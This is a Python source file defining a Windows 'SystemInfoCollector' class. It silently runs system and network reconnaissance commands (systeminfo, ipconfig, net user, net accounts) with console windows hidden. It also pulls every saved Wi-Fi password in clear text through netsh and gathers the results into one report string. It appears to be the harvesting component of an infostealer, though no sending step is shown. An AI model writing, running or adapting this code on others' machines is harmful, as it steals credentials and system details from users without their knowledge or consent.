import subprocess   

    
class SystemInfoCollector:
    def __init__(self):
        self.final_result = ""

    def _run_command(self, command, power_shell=False):
        try:
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            process = subprocess.Popen(command, startupinfo=startupinfo, stdout=subprocess.PIPE, 
                                       stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=power_shell, text=True).stdout.read()
            return str(process)+"\n"
        
        except subprocess.CalledProcessError as e:
                return f"Error: {e}"

    def add_sysinfo(self):
        self.result  = "\nSYSTEM INFO\n\n"
        command = ["systeminfo"]
        self.final_result += self.result+self._run_command(command)

    def add_ipconfig(self):
        command = ["ipconfig", "/all"]
        self.final_result += self._run_command(command)

    def add_netusers(self):
        command = ["net", "user"]
        self.result = self._run_command(command)
        self.result = subprocess.run(command, capture_output=True, text=True, check=True).stdout
        self.result = self.result.split("\n")[4:]
        self.result = list(filter(None, self.result))

        self.final_result += "\nNET USERS\n\n"+"\n".join(self.result[:-1]).strip()

    def add_netaccounts(self):
        command = ["net", "accounts"]
        self.final_result += "\nNET ACCOUNTS\n\n"+self._run_command(command)

    def extract_env_variables(self):
        command = ["set"]
        self.final_result += "\nENVIRONMENT VARIABLES\n\n"+self._run_command(command, power_shell=True)

    def extract_wifi_passwords(self):
        self.result = "\nWIFI PASSWORDS:\n\n"
        raw_string = self._run_command(["netsh", "wlan", "show", "profiles"])
        raw_string_list = raw_string.split('\n')

        profiles = [i.split(":")[1][1:] for i in raw_string_list if "All User Profile" in i]
        for profile in profiles:
            temp = subprocess.run(f"netsh wlan show profile name=\"{profile}\" key=clear", shell=True,
                                  capture_output=True, text=True).stdout.split("\n")
            pass_ = [i.split(":")[1][1:].strip() for i in temp if "Key Content" in i]
            if pass_:
                self.result += f"{profile} : {pass_[0]}\n"
                
        self.final_result += self.result

    def embed_all(self):
        self.final_result += "#############################################################\n"
        self.final_result += "#############################################################\n"
        self.final_result += "#############################################################\n\n"
        
        self.add_sysinfo()
        self.final_result += "#############################################################\n\n"
        self.add_ipconfig()
        self.final_result += "#############################################################\n\n"
        self.add_netusers()
        self.final_result += "\n\n#############################################################\n\n"
        self.add_netaccounts()
        self.final_result += "#############################################################\n\n"
        self.extract_wifi_passwords()
        # self.extract_env_variables()
        # self.final_result += "#############################################################\n\n"

        return self.final_result